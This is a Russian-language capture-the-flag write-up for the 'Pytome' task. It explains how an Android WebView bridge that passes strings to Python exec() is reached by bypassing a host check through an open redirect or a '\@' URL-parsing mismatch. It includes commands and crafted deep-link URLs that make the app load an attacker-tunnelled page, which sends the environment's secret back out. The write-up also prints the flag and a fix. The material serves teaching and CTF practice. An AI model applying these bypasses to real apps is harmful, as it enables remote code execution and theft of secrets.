# Pytome

**Флаг:** `avito{pYThON_In_WEbv13w_1s_D4NGEroUs}`

Android-приложение открывает deep link в WebView с JavaScript и методом
`AndroidBridge.eval`. Метод передаёт строку в Python `exec()`. Если загрузить в эту
WebView свою страницу, она прочитает `os.environ['FLAG']`.

## Обход проверки URL

Экспортируемая `DocsActivity` проверяет хост начального URL. Дальнейшие переходы
не проверяются, а Python bridge остаётся доступным.

Есть два пути: открытый редирект `/go?to=...` на доверенном сайте и разное толкование
`\@` проверкой URL и WebView. Во втором случае проверка видит доверенный хост после
`@`, а браузер загружает страницу сервера обратного вызова.

JavaScript этой страницы вызывает `AndroidBridge.eval`, читает окружение через
встроенный Python и отправляет результат обратно на сервер.

## Запуск

Запустите [exploit_server.py](exploit_server.py), затем предоставьте ему публичный
HTTPS-адрес:

```bash
uv run python pytome/exploit_server.py
cloudflared tunnel --url http://localhost:8000
```

Первый процесс должен оставаться запущенным. Отправьте ссылку Android-reviewer,
заменив адреса экземпляра и туннеля:

```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'name=medoedik' \
  --data-urlencode 'email=medoedik@avito.ru' \
  --data-urlencode 'url=pytome://docs?url=https://<tunnel-host>\@pytome-57ymra6o.avitoctf.ru/x' \
  --data-urlencode 'bug_type=other' --data-urlencode 'description=review'
```

Вариант URL через редирект:

```text
pytome://docs?url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://<tunnel-host>/x
```

Сервер принимает запрос на любом пути и выводит `[FLAG]` при получении секрета.
`NO_BRIDGE` означает, что страница открыта в обычном браузере, а не в нужной WebView.
Исходный APK `pytome.apk` не включён в Git.

Исправление — убрать выполнение произвольного Python через bridge и проверять
origin после каждого перехода WebView, включая редиректы.
